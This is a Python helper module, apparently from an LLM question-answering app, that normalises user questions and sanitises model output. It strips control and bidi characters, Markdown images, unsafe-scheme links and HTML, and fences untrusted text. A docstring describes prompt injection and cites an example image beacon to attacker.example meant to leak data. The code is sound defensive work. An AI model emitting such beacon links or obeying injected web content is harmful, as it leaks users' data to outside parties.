"""Input normalisation and output sanitisation helpers."""

from __future__ import annotations

import re
import unicodedata

# C0/C1 control chars except tab/newline/carriage return, plus bidi overrides
# (used for "Trojan Source"-style visual spoofing) and zero-width characters.
_UNSAFE_CHARS_RE = re.compile(
    "[\x00-\x08\x0b\x0c\x0e-\x1f\x7f-\x9f​-‏‪-‮⁦-⁩﻿]"
)
_LINK_TARGET = r"\((?:[^()\n]|\([^()\n]*\))*\)"  # allows one level of nested parentheses
_MD_IMAGE_RE = re.compile(r"!\[([^\]]*)\]" + _LINK_TARGET)
_HTML_TAG_RE = re.compile(r"</?[A-Za-z][^>]*>")
_UNSAFE_LINK_RE = re.compile(
    r"\[([^\]]*)\]\(\s*(?:javascript|data|vbscript|file):(?:[^()\n]|\([^()\n]*\))*\)", re.IGNORECASE
)


class InvalidQuestionError(ValueError):
    """Raised when a user question cannot be processed."""


def normalize_question(text: object, *, max_chars: int) -> str:
    """Normalise a user question and enforce a maximum length.

    * NFKC-normalises Unicode (folds full-width/compatibility forms),
    * removes control, zero-width and bidi-override characters,
    * collapses runs of whitespace.

    Raises:
        InvalidQuestionError: if the input is not a string or is too long.
            An empty result is returned as ``""`` so callers can decide how to
            respond.
    """
    if text is None:
        return ""
    if not isinstance(text, str):
        raise InvalidQuestionError("Question must be a string")
    if len(text) > max_chars * 4:  # cheap guard before doing any work
        raise InvalidQuestionError(f"Question exceeds {max_chars} characters")

    cleaned = unicodedata.normalize("NFKC", text)
    cleaned = _UNSAFE_CHARS_RE.sub("", cleaned)
    cleaned = " ".join(cleaned.split())
    if len(cleaned) > max_chars:
        raise InvalidQuestionError(f"Question exceeds {max_chars} characters")
    return cleaned


def sanitize_markdown_output(text: object) -> str:
    """Make LLM output safe to render as Markdown in the UI.

    The answer is built from untrusted web content, so a prompt-injected model
    could emit ``![x](https://attacker.example/?leak=...)`` (a zero-click data
    exfiltration beacon) or ``javascript:`` links. Images are replaced by their
    alt text, unsafe-scheme links by their label, and raw HTML tags are removed.
    """
    if text is None:
        return ""
    out = str(text)
    out = _UNSAFE_CHARS_RE.sub("", out)
    out = _MD_IMAGE_RE.sub(lambda m: m.group(1), out)
    out = _UNSAFE_LINK_RE.sub(lambda m: m.group(1), out)
    out = _HTML_TAG_RE.sub("", out)
    return out


def truncate(text: str, max_chars: int, *, suffix: str = " …[troncato]") -> str:
    """Truncate ``text`` to at most ``max_chars`` characters (suffix included)."""
    if max_chars <= 0:
        return ""
    if len(text) <= max_chars:
        return text
    if len(suffix) >= max_chars:
        return text[:max_chars]
    return text[: max_chars - len(suffix)] + suffix


def fence_untrusted(text: str, tag: str) -> str:
    """Wrap untrusted ``text`` in ``<tag>`` delimiters it cannot close itself."""
    neutralised = re.sub(rf"<\s*/?\s*{re.escape(tag)}\s*>", "[tag rimosso]", text, flags=re.IGNORECASE)
    return f"<{tag}>\n{neutralised}\n</{tag}>"
